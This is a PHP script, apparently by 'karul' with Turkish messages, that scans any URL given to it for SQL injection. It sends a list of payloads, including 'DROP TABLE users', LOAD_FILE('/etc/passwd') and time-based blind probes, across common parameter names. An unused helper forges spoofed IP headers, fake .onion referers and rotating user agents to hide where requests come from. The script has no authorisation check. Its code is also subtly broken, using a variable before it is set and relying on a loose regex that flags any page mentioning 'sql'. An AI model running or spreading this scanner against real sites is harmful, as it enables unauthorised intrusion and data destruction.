<?php
header('Content-Type: application/json');
ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');

$sql_payloads = array_unique([
    "' OR 1=1 --",
    "1' OR '1'='1",
    "1; DROP TABLE users --",
    "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
    "' UNION ALL SELECT database(), user(), version(), @@hostname, @@datadir --",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --",
    "1' OR UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1) --",
    "1' AND LOAD_FILE('/etc/passwd') --",
    "1' AND IF(1=1,SLEEP(5),0) --",
    "1' AND SUBSTRING((SELECT database()),1,1)='a' --",
    "1; WAITFOR DELAY '0:0:5' --",
    "1' OR BENCHMARK(1000000,MD5(1)) --",
    "1' AND PG_SLEEP(5) --",
    "1'/**/OR/**/1=1--",
    "1' OR '1'='1'/*bypass*/--",
    "1' UNION/**/SELECT/**/NULL,@@version,database(),user(),NULL--",
    "1' OR 0x31=0x31 --",
    "1' OR CHAR(49)=CHAR(49) --",
    "1' OR BINARY 'a'='A' --",
    "1' OR UNHEX(HEX(1))=1 --",
    "1' OR '1'=(SELECT '1' FROM dual)--",
    "1' OR /*!50000SELECT*/ 1=1 --",
    "1' OR 1=1#",
    "1'/**/UNION/**/ALL/**/SELECT/**/NULL,database()--",
    "1' OR SUBSTR((SELECT user()),1,1)='r' --",
    "1' AND 1=CAST((SELECT database()) AS SIGNED) --",
    "1' OR SLEEP(5) AND '1'='1' --",
    "1' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())>0 --",
    "1' AND (SELECT 1 FROM pg_tables WHERE tablename='users')>0 --",
    "1' OR EXISTS(SELECT * FROM sysobjects WHERE xtype='U') --",
    "1' AND DBMS_UTILITY.GET_TIME>0 --",
    "1' OR ROWNUM=1 AND 1=1 --",
    "1' OR 1=1 AND 'a'=UNHEX(HEX('a')) --",
    "1' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1 --",
    "1' OR 1=1 AND BINARY 'a'=CAST('a' AS BINARY) --",
    "1' OR 1=1 AND SUBSTRING((SELECT @@version),1,1) REGEXP '^[0-9]' --",
    "1' OR 1=1 AND CONV(HEX(1),16,10)=1 --",
    "1' OR UPPER('a')=UPPER('A') --",
    "1' OR 1=1 AND LENGTH(HEX(CAST(database() AS CHAR)))>0 --",
    "1' OR 1=1 AND ''='' --",
    "1' OR 1=1 AND NULL IS NULL --",
    "1' OR 1=1 AND 1+0=1 --",
    "1' OR 1=1 AND POW(1,1)=1 --",
    "1' OR SUBSTRING(HEX(UNHEX('a')),1,1)='6' --",
    "1' OR 1=1 AND ASCII(LEFT((SELECT database()),1))>0 --",
    "1' OR CONCAT('a','b')='ab' --",
    "1' OR 1=1 AND REPLACE('abc','b','')='ac' --",
    "1' OR 1=1 AND OCT(1)=1 --",
    "1' OR SUBSTRING_INDEX((SELECT user()),'@',1)='root' --",
    "1' OR 1=1 AND STRCMP('a','b')<0 --",
    "1' OR COALESCE((SELECT database()),1)=database() --",
    "1' OR 1=1 AND LEFT(RIGHT('test',3),1)='s' --",
    "1' OR 1=1 AND MD5(1)=MD5(1) --",
    "1' OR 1=1 AND SHA1('test')=SHA1('test') --",
    "1' OR JSON_EXTRACT('{\"a\":1}', '$.a')=1 --",
    "1' OR REGEXP_REPLACE('test', 't', '')='es' --",
    "1' OR 1=1 AND UUID() LIKE '%-%' --"
]);

$parameters = [
    "id",
    "q",
    "search",
    "user",
    "page",
    "data",
    "name",
    "key",
    "value",
    "input"
];

function ultra_anonim_scan($url, $payload, $param, $user_proxy = null) {
    $start_time = microtime(true);
    $ch = curl_init();
    $test_url = $url . "?" . $param . "=" . urlencode($payload);

    if ($user_proxy && filter_var($user_proxy, FILTER_VALIDATE_URL)) {
        curl_setopt($ch, CURLOPT_PROXY, $user_proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    } else {
        $fake_headers = [
            "Forwarded-For: " . implode(", ", array_map(function() { return rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255); }, range(1, 20))),
            "Client-IP: " . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255),
            "Via: 1.1 proxy" . rand(1, 9999) . ".example.com, 1.0 tor" . rand(1, 9999) . ".onion",
            "Real-IP: " . rand(1, 255) . "." . rand(0, 255) . "." . rand(1, 255),
            "Forwarded: for=" . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255) . ";proto=https;by=proxy" . rand(1, 9999),
            "Anon-Level: Sizlere bağlı ",
            "Proxy-Chain: anon" . rand(1, 9999) . ", hidden" . rand(1, 9999),
            "Origin-IP: " . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255),
            "Tunnel: encrypted-infinity-" . rand(10000, 99999),
            "Cache-Control: no-cache, no-store, must-revalidate",
            "Pragma: no-cache",
            "Connection: close"
        ];
        $agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/119.0",
            "curl/8.0.1",
            "Mozilla/5.0 (compatible; Scanner/V2.0; +http://nowhere.com)"
        ];
        curl_setopt($ch, CURLOPT_HTTPHEADER, $fake_headers);
        curl_setopt($ch, CURLOPT_USERAGENT, $agents[array_rand($agents)]);
        curl_setopt($ch, CURLOPT_REFERER, "https://infinity" . rand(1000, 9999) . ".onion/" . rand(100000, 999999));
    }

    curl_setopt($ch, CURLOPT_URL, $test_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
    curl_setopt($ch, CURLOPT_COOKIE, "session=" . bin2hex(random_bytes(16)));
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        $error = curl_error($ch);
        curl_close($ch);
        return ["error" => "Bağlantı hatası: $error"];
    }
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $end_time = microtime(true);
    curl_close($ch);

    return [
        "response" => $response,
        "http_code" => $http_code,
        "elapsed" => $end_time - $start_time,
        "full_url" => $test_url,
        "proxy_used" => $user_proxy ?: "Dahili Kendi ağımız "
    ];
}

function test_sql_injection($url, $user_proxy = null) {
    global $sql_payloads, $parameters;
    $results = [];
    $mh = curl_multi_init();
    $curl_handles = [];
    $log = [];

    foreach ($parameters as $param) {
        foreach ($sql_payloads as $index => $payload) {
            $ch = curl_init();
            $test_url = $url . "?" . $param . "=" . urlencode($payload);
            curl_setopt($ch, CURLOPT_URL, $test_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_multi_add_handle($mh, $ch);
            $curl_handles[$index . "_" . $param] = [$ch, $payload, $param];
            $log[] = ["tested_url" => $test_url, "payload" => $payload, "parameter" => $param];
        }
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);

    foreach ($curl_handles as $key => $handle) {
        $ch = $handle[0];
        $payload = $handle[1];
        $param = $handle[2];
        $response = curl_multi_getcontent($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $elapsed = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        $full_url = $url . "?" . $param . "=" . urlencode($payload);
        $vulnerable_php_url = $vulnerability ? ($url . ".php?" . $param . "=" . urlencode($payload)) : null;

        $status = "Bilinmeyen yanıt";
        $db_type = "Bilinmiyor";
        $vulnerability = null;
        $confidence = 0;

        if (preg_match('/mysql|mysqli|sql/i', $response)) {
            $status = "Açık bulundu: MySQL hatası";
            $db_type = "MySQL";
            $vulnerability = "SQL Enjeksiyonu";
            $confidence = 95;
        } elseif (preg_match('/postgres|pgsql/i', $response)) {
            $status = "Açık bulundu: PostgreSQL hatası";
            $db_type = "PostgreSQL";
            $vulnerability = "SQL Enjeksiyonu";
            $confidence = 95;
        } elseif (preg_match('/ora-|oracle/i', $response)) {
            $status = "Açık bulundu: Oracle hatası";
            $db_type = "Oracle";
            $vulnerability = "SQL Enjeksiyonu";
            $confidence = 95;
        } elseif (preg_match('/mssql|sqlsrv/i', $response)) {
            $status = "Açık bulundu: MSSQL hatası";
            $db_type = "MSSQL";
            $vulnerability = "SQL Enjeksiyonu";
            $confidence = 95;
        } elseif ($elapsed > 4 && (strpos($payload, 'SLEEP') !== false || strpos($payload, 'WAITFOR') !== false || strpos($payload, 'BENCHMARK') !== false)) {
            $status = "Zaman tabanlı açık: " . round($elapsed, 2) . " saniye gecikme";
            $vulnerability = "Kör SQL Enjeksiyonu (Zaman Tabanlı)";
            $confidence = 90;
        } elseif ($http_code == 403 || $http_code == 429) {
            $status = "WAF algılandı: Şüpheli yanıt";
            $confidence = 50;
        } elseif ($http_code == 500) {
            $status = "Sunucu hatası: Olası açık";
            $vulnerability = "Potansiyel SQL Enjeksiyonu";
            $confidence = 80;
        } elseif ($http_code == 200 && strlen($response) > 0 && preg_match('/database|user|version|hostname|datadir|basedir|passwd|columns|tables/i', $response)) {
            $status = "Açık bulundu: Veri sızması";
            $vulnerability = "SQL Enjeksiyonu (Veri Sızması)";
            $confidence = 98;
        } else {
            $status = "Açık bulunamadı";
            $confidence = 10;
        }

        $vulnerable_php_url = $vulnerability ? ($url . ".php?" . $param . "=" . urlencode($payload)) : null;

        $results[] = [
            "payload" => $payload,
            "status" => $status,
            "http_code" => $http_code,
            "elapsed_time" => round($elapsed, 3),
            "db_type" => $db_type,
            "vulnerable_url" => $vulnerable_php_url,
            "vulnerability_type" => $vulnerability,
            "parameter" => $param,
            "proxy_used" => $user_proxy ?: "Dahili Kendi ağımız",
            "confidence" => $confidence
        ];
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);

    file_put_contents('scan_log.json', json_encode($log, JSON_PRETTY_PRINT));
    return $results;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!isset($_GET['url']) || empty($_GET['url'])) {
        $output = [
            "status" => "hata",
            "message" => "url göndermen lazım",
            "timestamp" => date('Y-m-d H:i:s'),
            "execution_time" => microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"],
            "version" => "size bağlı",
            "author" => "karul"
        ];
        echo json_encode($output, JSON_PRETTY_PRINT);
        http_response_code(400);
        exit;
    }

    $raw_url = filter_var($_GET['url'], FILTER_SANITIZE_URL);
    $url = strpos($raw_url, 'http') === 0 ? $raw_url : "http://$raw_url";
    $user_proxy = isset($_GET['proxy']) ? filter_var($_GET['proxy'], FILTER_SANITIZE_URL) : null;
    $scan_results = test_sql_injection($url, $user_proxy);
    $vulnerabilities_found = array_filter($scan_results, function($result) {
        return $result['vulnerability_type'] !== null;
    });

    $output = [
        "status" => "başarılı",
        "url" => $url,
        "results" => $scan_results,
        "vulnerabilities" => array_values($vulnerabilities_found),
        "total_payloads" => count($sql_payloads) * count($parameters),
        "vulnerability_count" => count($vulnerabilities_found),
        "proxy_used" => $user_proxy ?: "Dahili kendi ağımız",
        "timestamp" => date('Y-m-d H:i:s'),
        "execution_time" => round(microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"], 3),
        "version" => "size bağlı",
        "author" => "karul"
    ];
    echo json_encode($output, JSON_PRETTY_PRINT);
} else {
    $output = [
        "status" => "hata",
        "message" => "Sadece get isteği desteklenir",
        "timestamp" => date('Y-m-d H:i:s'),
        "execution_time" => microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"],
        "version" => "size bağlı",
        "author" => "karul"
    ];
    echo json_encode($output, JSON_PRETTY_PRINT);
    http_response_code(405);
}
?>